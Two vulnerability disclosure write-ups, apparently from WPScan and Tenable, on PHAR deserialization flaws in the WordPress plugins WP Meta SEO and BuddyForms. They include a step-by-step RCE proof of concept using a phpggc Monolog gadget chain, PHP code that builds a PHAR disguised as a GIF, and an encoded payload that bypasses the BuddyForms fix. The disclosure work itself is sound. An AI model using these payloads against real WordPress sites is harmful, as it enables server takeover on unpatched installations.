##
#
https://wpscan.com/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/
#
https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8
#
##

Uncovering a PHAR Deserialization Vulnerability in WP Meta SEO and Escalating to RCE
During an internal audit, the WPScan team found a vulnerability in the WP Meta SEO plugin. This vulnerability allows attackers with at least Author privileges to upload and deserialize a PHAR file, leading to arbitrary PHP object deserialization. We were able to escalate this vulnerability to remote code execution, without the need for additional code on the server.

In this post, we’ll provide an overview of the vulnerability and explain how it can be exploited. We’ll also share our advanced proof‑of‑concept that escalates to RCE.

We reported this issue to the plugin authors, and a fix was released in version 4.5.5. We strongly recommend that site owners update to the latest version to protect their sites. Additionally, using a robust security solution like Jetpack Security can help to protect against such vulnerabilities in the future.

Plugin Name	WP Meta SEO
Plugin URL	https://wordpress.org/plugins/wp-meta-seo
Author	https://www.joomunited.com
Fixed Version	4.5.5
CVE-ID	CVE-2023-1381
WPScan ID	f140a928-d297-4bd1-8552-bfebcedba536
CVSSv3.1	7.2
Vulnerability Details
WP Meta SEO offers an “SEO Page Optimization” feature that can analyze post content and images.

When the “Reload Analysis” button is clicked, the post contents within the editor are sent to the server for analysis. As a part of this analysis, any referenced image files are inspected and processed.

Here are the relevant snippets from the inc/class.metaseo‑admin.php file:


public function reloadAnalysis()
{
    ...
 
    $content = apply_filters(
        'wpms_the_content',
        '<div>' . html_entity_decode(stripcslashes($_POST['datas']['content']), ENT_COMPAT, 'UTF-8') . '</div>',
        $_POST['datas']['post_id']
    );
 
    ...
 
    // image resize
    if ($content === '') {
        ...
    } else {
        // Extracting the specified elements from the web page
        $img_tags = wpmsExtractTags($content, 'img', true, true);
        $img_wrong = false;
        $img_wrong_alt = false;
        foreach ($img_tags as $order => $tag) {
            if (!isset($tag['attributes']['src'])) {
                continue;
            }
 
            $src = $tag['attributes']['src'];
            $imgpath = str_replace(site_url(), ABSPATH, $src);
            if (!file_exists($imgpath)) {
                continue;
            }
            ...
        }
        ...
    }
    ...
}
The $content variable is populated with POST data from the browser. This is used to find image URL’s, which are then converted to file paths and passed to the file_exists function.

This can be exploited because of a quirk in PHP: if the path given to file_exists uses the phar:// stream wrapper and points to a .phar file or its contents, the PHP metadata object within this file will be automatically deserialized.

Caveat
This type of vulnerability was addressed in PHP 8.0 by disabling the automatic deserialization of PHAR metadata. As a result, WordPress instances running on PHP 8.0 and above are not susceptible to this vulnerability.

Proof Of Concept
The public disclosure includes a step‑by‑step proof‑of‑concept demonstrating how to exploit the vulnerability. In summary, an attacker can upload a malicious PHAR file to the server disguised as a JPG and then trigger a file_exists call using a crafted string, such as phar://path/to/malicious.phar/example.png, in an image src attribute. This will cause the server to deserialize the PHAR file and potentially trigger a gadget, such as the __wakeup method of the Evil class in the provided POC.

Escalating to RCE
During the investigation, we noticed the inc/lib/google‑api/vendor directory contained libraries with known deserialization gadgets, including guzzlehttp and monolog. However, at the time when the vulnerable code was executed, these libraries were not being loaded.

Upon further inspection, however, were able to identify a way to modify the request to force the libraries with the gadgets to be autoloaded before the vulnerable code was executed.

Consider the following code snippets. First, in wp‑meta‑seo.php we see the following:

```
if (is_admin()) {
 
    ...
 
 
    if (isset($_GET['task']) && $_GET['task'] === 'wpms_ga') {
        if (!empty($_GET['code'])) {
            $google_analytics =  get_option('wpms_google_alanytics');
 
            if (is_array($google_analytics)) {
                $google_analytics['code'] = $_GET['code'];
 
                require_once WPMETASEO_PLUGIN_DIR . 'inc/google_analytics/wpmstools.php';
                $ggClient = WpmsGaTools::initClient($google_analytics['wpmsga_dash_clientid'], $google_analytics['wpmsga_dash_clientsecret']);
 
                ...
            }
            ...
        }
        ...
    }
    ...
}
```

Second, the implementation of WpmsGaTools::initClient within inc/google_analytics/wpmstools.php is as follows:

```
public static function initClient($clientId, $clientSecret)
{
    require_once WPMETASEO_PLUGIN_DIR . 'inc/google_analytics/wpmsgapi.php';
    require_once WPMETASEO_PLUGIN_DIR . 'inc/lib/google-api/vendor/autoload.php';
 
    ...
}
```


When triggered, this will load the autoloader from the google‑api library, which will in turn autoload the gadget code.

Since this code is loaded at the beginning of every request to WP Admin, we were able to craft a request that passed all of the conditions and use a gadget to acheive remote code execution.

Following is the step‑by‑step POC. Note that this POC requires a vulnerable configuration, as outlined below.

Use a WordPress instance on PHP 7.x.
Create a PHAR file with an RCE gadget chain for the monolog PHP library. This can be done using the phpggc tool. Run the following command with an arbitrary JPG file (you may need to set Phar.readonly = Off in your php.ini file): phpggc --phar‑jpeg path/to/image.jpg -o poc.jpg Monolog/RCE1 system id
Upload poc.jpg using the Media Editor. Take note of its path within wp‑content/uploads
To ensure the site is in the vulnerable configuration, as an admin user, visit /wp‑admin/admin.php?page=metaseo_google_analytics&view=wpms_gg_service_data, enter arbitrary information in the Client ID and Client Secret fields, and click “Save and Connect”. This will fail to connect if the ID and Secret are invalid, but either way it will add the needed data to the database.
Create or edit a post or page in the block editor. Add an HTML block with the following contents (but replace any parts of the path to poc.jpg as needed for your test server): <img src="phar://../wp‑content/uploads/2023/03/poc.jpg/test.txt">
Without saving the post or page, open the browser console to view network traffic, then click on “Reload Analysis” in the “SEO Page Optimization” section. Intercept the request (e.g. using BurpSuite), and add the following URL parameters: task=wpms_ga&code=UA‑1234
Note that the response body of the request will contain the output of the id command after the end of the JSON output.
Conclusion
The discovered vulnerability in WP Meta SEO allows attackers with at least Author privileges to upload and deserialize an arbitrary PHAR file. On PHP versions before 8.0, this can be used to achieve remove code execution due to the existence of suitable gadgets within the plugin. The vulnerability has been fixed in version 4.5.5, and we strongly recommend that all site owners update to the latest version of the plugin as soon as possible.

It’s important to note that vulnerabilities can be discovered in any plugin or software, and the WPScan team works hard to protect users by identifying and reporting such issues to the plugin authors. Remember to always keep your software up‑to‑date, and consider using a robust security solution like Jetpack Security to further improve the security of your site.



WordPress BuddyForms Plugin — Unauthenticated Insecure Deserialization (CVE-2023–26326)
Joshua Martinelle
Tenable TechBlog
Joshua Martinelle

·
Follow

Published in
Tenable TechBlog

·
5 min read
·
Mar 7, 2023
131






WordPress Core is the most popular web Content Management System (CMS). This free and open-source CMS written in PHP allows developers to develop web applications quickly by allowing customization through plugins and themes. WordPress can work in both a single-site or a multisite installation.

In this article, we will analyze an unauthenticated insecure deserialization vulnerability found in the in the BuddyForm plugin.

Reference: https://wordpress.org/plugins/buddyforms/
Affected Versions: < 2.7.8
CVSSv3 Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSSv3 Score: 8.1

BuddyForms is a simple drag and drop form builder with ready to use form templates that give you all the form types with on click.

In the vulnerable versions, the problem lies in the ‘buddyforms_upload_image_from_url()’ function of the ‘./includes/functions.php’ file

```
function buddyforms_upload_image_from_url() {
 $url            = isset( $_REQUEST['url'] ) ? wp_kses_post( wp_unslash( $_REQUEST['url'] ) ) : '';
 $file_id        = isset( $_REQUEST['id'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['id'] ) ) : '';
 $accepted_files = isset( $_REQUEST['accepted_files'] ) ? explode( ',', buddyforms_sanitize( '', wp_unslash( $_REQUEST['accepted_files'] ) ) ) : array( 'jpeg' );

 if ( ! empty( $url ) && ! empty( $file_id ) ) {
  $upload_dir             = wp_upload_dir();
  $image_url              = urldecode( $url );
  $image_data             = file_get_contents( $image_url ); // Get image data
  $image_data_information = getimagesize( $image_url );
  $image_mime_information = $image_data_information['mime'];

  if ( ! in_array( $image_mime_information, $accepted_files ) ) {
   echo wp_json_encode(
    array(
     'status'   => 'FAILED',
     'response' => __(
      'File type ' . $image_mime_information . ' is not allowed.',
      'budduforms'
     ),
    )
   );
   die();
  }

  if ( $image_data && $image_data_information ) {
   $file_name   = $file_id . '.png';
   $full_path   = wp_normalize_path( $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name );
   $upload_file = wp_upload_bits( $file_name, null, $image_data );
   if ( ! $upload_file['error'] ) {
    $wp_filetype   = wp_check_filetype( $file_name, null );
    $attachment    = array(
     'post_mime_type' => $wp_filetype['type'],
     'post_title'     => preg_replace( '/\.[^.]+$/', '', $file_name ),
     'post_content'   => '',
     'post_status'    => 'inherit',
    );
    $attachment_id = wp_insert_attachment( $attachment, $upload_file['file'] );
    $url           = wp_get_attachment_thumb_url( $attachment_id );
    echo wp_json_encode(
     array(
      'status'        => 'OK',
      'response'      => $url,
      'attachment_id' => $attachment_id,
     )
    );
    die();
   }

   [...]
}
```

This function has several problems that allow to perform an insecure deserialization in several steps.

The ‘url’ parameter’ accept an arbitrary value, no verification is done
The ‘accepted_files’ parameter can be added to the request to specify an arbitrary mime type which allows to bypass the mime verification type
The PHP function ‘getimagesize()’ is used, this function does not check the file and therefore assumes that it is an image that is passed to it. However, if a non-image file is supplied, it may be incorrectly detected as an image and the function will successfully return
The PHP function ‘file_get_contents()’ is used without any prior check. This function allows the use of the ‘phar://’ wrapper. The Phar (PHP Archive) files contain metadata in serialized format, so when they are parsed, this metadata is deserialized.
If all conditions are met, the file is downloaded and stored on the server and the URL of the image is returned to the user.

The exploitation of this vulnerability is based on 3 steps

Create a malicious phar file by making it look like an image.
Send the malicious phar file on the server
Call the file with the ‘phar://’ wrapper.
The main difficulty in exploiting this vulnerability is to find a gadget chain. There are several known gadgets chain for WordPress but they are no longer valid on the latest versions.

The plugin itself does not seem to contain any gadget chain either. So, in order to trigger the vulnerability we will simulate the presence of a plugin allowing the exploitation.

So we can add a fake WordPress extension named “dummy”, which contains only a file “dummy.php” with the following code :
```
<?php
/*
Plugin Name: Dummy
*/

class Evil {
  public function __wakeup() : void {
    die("Arbitrary deserialization");
  }
}

function display_hello_world() {
    echo "Hello World";
}

add_action('wp_footer', 'display_hello_world');
Proof Of Concept
The first step of our exploitation is to create our malicious phar archive which will have to pretend to be an image :

<?php

class Evil{
  public function __wakeup() : void {
    die("Arbitrary Deserialization");
  }
}
```

//create new Phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();
Note the presence of ‘GIF89a’ which will make the plugin believe that our file is a GIF image

root@vmi652687:/tmp# php --define phar.readonly=0 evil.php
root@vmi652687:/tmp# strings evil.phar
GIF89a
<?php __HALT_COMPILER(); ?>
O:4:"Evil":0:{}
test.txt
text
WJFP5
GBMB
So as a reminder, our WordPress installation has two plugins, BuddyForms as well as our ‘dummy’ plugin which simulates a vulnerable plugin allowing a gadget chain


We send our file to the server via a POST request containing the correct parameters expected by the function described above


The server answers OK and tells us that the file is available at the URL http://domain.tld/wp-content/uploads/2023/02/1.png which can be checked by opening the corresponding folder in your browser


So we just have to do the same action again, except that this time we will use the phar:// wrapper in the URL and indicate the path of our file.

By chance, the structure of wordpress folders is always the same, you just have to go up one folder to access wp-content. So, it is possible to use the relative path to our file stored on the server


And voila, we managed to trigger an arbitrary deserialization

As sometimes a picture is worth a thousand words, here is a diagram that summarizes the explanation




The fix
In version 2.7.8, the author has made a simple fix, just check if the ‘phar://’ wrapper is used

if ( strpos( $valid_url, 'phar://' ) !== false ) {
  return;
}
In my opinion, this correction seems insufficient because the downloaded file is still not verified, it would still be possible to exploit the vulnerability if another plugin allows to call an arbitrary file.

[EDIT] : Jesús Calderón identified a bypass for this fix. The check added, does not check that the value of ‘$valid_url’ is decoded
So, is possible to use the following payload :

phar%253a%252f%252f..%252fwp-content%252fuploads%252f2023%252f03%252fpayload.phar
Infosec
Tenable Research
WordPress

